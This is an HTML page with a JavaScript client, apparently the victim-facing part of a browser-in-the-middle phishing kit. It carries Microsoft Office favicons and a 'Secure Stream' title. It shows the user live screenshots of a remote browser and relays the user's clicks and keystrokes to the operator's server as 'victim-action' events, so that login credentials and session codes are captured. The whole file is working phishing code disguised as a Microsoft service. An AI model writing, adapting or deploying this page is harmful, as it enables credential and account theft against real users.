<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Stream</title>
    
    <link rel="icon" type="image/x-icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/favicons/favicon.ico">
    <link rel="apple-touch-icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/favicons/favicon-32x32.png">

    <style>
        body { 
            background: #000; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden; 
            user-select: none;
        }
        #mirror { 
            max-width: 100%; 
            max-height: 100%; 
            object-fit: contain; 
            display: none; 
            cursor: crosshair; 
            image-rendering: -webkit-optimize-contrast; /* Sharpens the stream */
        }
        #loader { 
            color: #777; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            font-size: 13px; 
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <div id="loader">INITIALIZING_SECURE_STREAM...</div>
    <img id="mirror" draggable="false" />

    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        const socket = io({ transports: ['websocket'] });
        const img = document.getElementById('mirror');
        const loader = document.getElementById('loader');

        // Render Engine
        socket.on('browser-render', (data) => {
            if (data.screenshot) {
                if (loader.style.display !== 'none') {
                    loader.style.display = 'none';
                    img.style.display = 'block';
                }
                img.src = 'data:image/jpeg;base64,' + data.screenshot;
            }
        });

        // Mouse Engine (Scaled for 1280x720 internal resolution)
        img.addEventListener('mousedown', (e) => {
            const rect = img.getBoundingClientRect();
            const scaleX = 1280 / rect.width;
            const scaleY = 720 / rect.height;
            const x = Math.round((e.clientX - rect.left) * scaleX);
            const y = Math.round((e.clientY - rect.top) * scaleY);

            socket.emit('victim-action', { type: 'click', x, y });
        });

        // Keyboard Engine (Bypass System Keys)
        window.addEventListener('keydown', (e) => {
            const forbidden = ["Backspace", "Tab", "Enter", "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"];
            
            if (forbidden.includes(e.key)) {
                e.preventDefault();
            }

            // Ignore standalone modifiers to prevent duplicate ghost-keys
            if (["Control", "Shift", "Alt", "Meta"].includes(e.key)) return;

            socket.emit('victim-action', { 
                type: 'key', 
                key: e.key 
            });
        });
    </script>
</body>
</html>
